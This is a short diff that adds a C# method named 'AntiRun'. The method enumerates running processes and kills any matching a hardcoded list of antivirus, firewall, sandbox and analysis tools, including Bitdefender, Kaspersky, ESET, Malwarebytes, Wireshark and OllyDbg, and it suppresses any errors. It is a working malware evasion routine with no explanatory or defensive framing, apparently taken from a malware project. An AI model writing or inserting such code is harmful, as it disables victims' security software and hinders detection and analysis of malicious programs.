@@ -1,0 +1,15 @@
+public static void AntiRun()
+    {
+        try
+        {
+            List<string> L = new List<string>(new string[] { "sample", "outpost", "npfmsg", "bdagent", "kavsvc", "egui", "zlclient", "sbiesvc", "keyscrambler", "wireshark", "mbam", "ollydbg" });
+            foreach (System.Diagnostics.Process pr in System.Diagnostics.Process.GetProcesses())
+            {
+                if (L.Contains(pr.ProcessName.ToLower()))
+                {
+                    pr.Kill();
+                }
+            }
+        }
+        catch { }
+    }
